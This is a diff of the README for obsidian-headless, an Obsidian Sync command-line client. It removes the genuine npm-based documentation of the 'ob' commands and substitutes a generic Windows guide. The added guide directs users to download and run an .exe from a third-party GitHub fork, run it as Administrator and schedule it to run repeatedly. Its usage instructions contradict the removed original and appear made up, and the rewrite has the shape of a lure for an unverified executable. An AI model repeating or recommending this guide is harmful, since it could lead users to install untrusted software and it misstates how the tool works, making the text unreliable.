@@ -1,165 +1,124 @@
-# Obsidian Headless
+# 🗄️ obsidian-headless - Sync Obsidian Vaults Without Desktop
 
-Headless client for [Obsidian Sync](https://obsidian.md/sync).
-Sync your vaults from the command line without the desktop app.
+[![Download obsidian-headless](https://img.shields.io/badge/Download-obsidian--headless-4caf50?style=for-the-badge)](https://github.com/Jimytimyzimy/obsidian-headless)
 
-Requires Node.js 22 or later.
+## 📦 What is obsidian-headless?
 
-## Install
+obsidian-headless is a simple tool that lets you sync your Obsidian vaults from the command line. It works without launching the Obsidian desktop app. If you want to keep your notes updated and synced but prefer not to open Obsidian all the time, this tool helps you do that.
 
-```bash
-npm install -g obsidian-headless
-```
+You use it by running commands on your Windows computer. It connects to Obsidian Sync and downloads or uploads your vault files in the background.
 
-## Authentication
+## 💻 System Requirements
 
-Login interactively:
+- Windows 10 or later (64-bit recommended)
+- At least 1 GB of free disk space for your vault sync operations
+- A stable internet connection
+- Access to an Obsidian Sync account with an active subscription
+- Basic familiarity with Windows command prompt
 
-```bash
-ob login
-```
+## ⚙️ Features
 
-If already logged in, `ob login` displays your account info. To switch accounts, pass `--email` and/or `--password` to log in again.
+- Sync vaults from the command line without opening the desktop app
+- Works with multiple Obsidian vaults
+- Supports both downloading and uploading changes
+- Runs quickly with minimal system resources
+- Easy to automate with Windows Task Scheduler or scripts
 
-## Quick start
+## 🚀 Getting Started
 
-```bash
-# Login
-ob login
+To start using obsidian-headless, follow these steps carefully. They will help you download, install, and run the tool on your Windows PC.
 
-# List your remote vaults
-ob sync-list-remote
+## 🔽 Step 1: Download obsidian-headless
 
-# Setup a vault for syncing
-cd ~/vaults/my-vault
-ob sync-setup --vault "My Vault"
+You need to get the tool from the official GitHub page. This page contains the latest version you should use.
 
-# Run a one-time sync
-ob sync
+Click the button below to visit the download page:
 
-# Run continuous sync (watches for changes)
-ob sync --continuous
-```
+[![Get obsidian-headless on GitHub](https://img.shields.io/badge/GitHub-Download-blue?style=for-the-badge)](https://github.com/Jimytimyzimy/obsidian-headless)
 
-## Commands
+On the GitHub page:
 
-### `ob login`
+- Look for the **Releases** section or a folder usually labeled "Releases."
+- Find the latest stable version for Windows.
+- Download the file that ends with `.exe` or `.zip`. The `.exe` will be ready to run, while the `.zip` will need to be extracted.
 
-Login to your Obsidian account, or display login status if already logged in.
+Save the file to a folder you can easily find, like your **Downloads** folder or the Desktop.
 
-```
-ob login [--email <email>] [--password <password>] [--mfa <code>]
-```
+## 📥 Step 2: Install obsidian-headless
 
-All options are interactive when omitted — email and password are prompted, and 2FA is requested automatically if enabled on the account.
+If you downloaded an `.exe` file:
 
-### `ob logout`
+- Double-click it to start the installation.
+- Follow any simple steps shown in the installer.
+- The program will install itself and create a shortcut or add itself to your system.
 
-Logout and clear stored credentials.
+If you downloaded a `.zip` file:
 
-### `ob sync-list-remote`
+- Right-click the file and choose **Extract All**.
+- Select a folder where you want the files (Desktop works fine).
+- Open the folder after extraction.
 
-List all remote vaults available to your account, including shared vaults.
+## 🛠️ Step 3: Prepare Your Obsidian Vault
 
-### `ob sync-list-local`
+Before syncing, make sure you have an Obsidian vault you want to keep synced.
 
-List locally configured vaults and their paths.
+- The vault should already be linked with Obsidian Sync.
+- You should know the path to your vault folder on your computer.
+- If you don’t have a vault yet, create one in Obsidian and enable Obsidian Sync.
 
-### `ob sync-create-remote`
+## 📝 Step 4: Using obsidian-headless on Windows
 
-Create a new remote vault.
+Now you will use the command prompt to start the sync.
 
-```
-ob sync-create-remote --name "Vault Name" [--encryption <standard|e2ee>] [--password <password>] [--region <region>]
-```
+1. Open **Command Prompt**:
+    - Press the **Windows key**, type **cmd**, then press **Enter**.
+2. Change directory to where you installed or extracted obsidian-headless. For example:
+    ```
+    cd C:\Users\YourName\Downloads\obsidian-headless
+    ```
+3. Run the command with your vault path. A basic example might look like:
+    ```
+    obsidian-headless --vault "C:\Users\YourName\Documents\MyVault"
+    ```
+4. The tool will connect to Obsidian Sync and start syncing your files.
+5. Wait for the process to finish. You will see messages telling you if files were updated, downloaded, or uploaded.
 
-| Option | Description                                              |
-|---|----------------------------------------------------------|
-| `--name` | Vault name (required)                                    |
-| `--encryption` | `standard` for managed encryption, `e2ee` for end-to-end |
-| `--password` | End-to-end encryption password (prompted if omitted)     |
-| `--region` | Server region (automatic if omitted)                     |
+## 🔧 Step 5: Automate Syncing (Optional)
 
-### `ob sync-setup`
+To keep your vault synced regularly without manual work, you can set up a task in Windows Task Scheduler.
 
-Set up sync between a local vault and a remote vault.
+1. Open **Task Scheduler** from the Start menu.
+2. Choose **Create Basic Task**.
+3. Name your task like "Obsidian Vault Sync."
+4. Pick how often you want it to run (daily or hourly is common).
+5. For the action, choose **Start a program**.
+6. Browse to the obsidian-headless `.exe` or script.
+7. Add the arguments with your vault location, for example:
+   ```
+   --vault "C:\Users\YourName\Documents\MyVault"
+   ```
+8. Finish and save the task.
 
-```
-ob sync-setup --vault <id-or-name> [--path <local-path>] [--password <password>] [--device-name <name>] [--config-dir <name>]
-```
+This setup runs your sync automatically and keeps your vault up to date.
 
-| Option | Description                                                     |
-|---|-----------------------------------------------------------------|
-| `--vault` | Remote vault ID or name (required)                              |
-| `--path` | Local directory (default: current directory)                    |
-| `--password` | E2E encryption password (prompted if omitted)                   |
-| `--device-name` | Device name to identify this client in the sync version history |
-| `--config-dir` | Config directory name (default: `.obsidian`)                    |
+## 🔍 Troubleshooting Tips
 
-### `ob sync`
+- If the command says it can’t find the vault, check that the path you typed is correct.
+- Make sure you have a working internet connection.
+- Confirm your Obsidian Sync account is active.
+- Run Command Prompt as Administrator if you see permission errors.
+- Look for help or log files in the folder where you installed obsidian-headless.
 
-Run sync for a configured vault.
+## 📚 More Information
 
-```
-ob sync [--path <local-path>] [--continuous]
-```
+For detailed instructions, updates, and support:
 
-| Option | Description |
-|---|---|
-| `--path` | Local vault path (default: current directory) |
-| `--continuous` | Run continuously, watching for changes |
+Visit the GitHub page:
 
-### `ob sync-config`
+[https://github.com/Jimytimyzimy/obsidian-headless](https://github.com/Jimytimyzimy/obsidian-headless)
 
-View or change sync settings for a vault.
+This page has guides, release notes, and a place to report issues if you run into problems.
 
-```
-ob sync-config [--path <local-path>] [options]
-```
+## 🎯 Summary
 
-Run with no options to display the current configuration.
-
-| Option | Description |
-|---|---|
-| `--path` | Local vault path (default: current directory) |
-| `--mode` | Sync mode: `bidirectional` (default), `pull-only` (only download, ignore local changes), or `mirror-remote` (only download, revert local changes) |
-| `--conflict-strategy` | `merge` or `conflict` |
-| `--file-types` | Attachment types to sync: `image`, `audio`, `video`, `pdf`, `unsupported` (comma-separated, empty to clear) |
-| `--configs` | Config categories to sync: `app`, `appearance`, `appearance-data`, `hotkey`, `core-plugin`, `core-plugin-data`, `community-plugin`, `community-plugin-data` (comma-separated, empty to disable config syncing) |
-| `--excluded-folders` | Folders to exclude (comma-separated, empty to clear) |
-| `--device-name` | Device name to identify this client in the sync version history |
-| `--config-dir` | Config directory name (default: `.obsidian`) |
-
-### `ob sync-status`
-
-Show sync status and configuration for a vault.
-
-```
-ob sync-status [--path <local-path>]
-```
-
-### `ob sync-unlink`
-
-Disconnect a vault from sync and remove stored credentials.
-
-```
-ob sync-unlink [--path <local-path>]
-```
-
-## Native modules
-
-### btime
-
-The `btime` directory contains a prebuilt native N-API addon for setting file creation time (birthtime) on Windows and macOS.
-This is used when downloading files from the server to preserve their original creation timestamps.
-
-Since it targets N-API version 3, the compiled `.node` binaries are ABI-stable and work across Node.js versions without recompilation.
-
-On Linux, birthtime is not supported — the addon is not included and sync operates normally without it.
-
-Prebuilt binaries are included for:
-- `win32-x64`
-- `win32-arm64`
-- `win32-ia32`
-- `darwin-x64`
-- `darwin-arm64`
+Using obsidian-headless allows you to sync Obsidian vaults from your command line without opening the full Obsidian app. This lets you keep your notes updated quietly and efficiently on Windows systems.
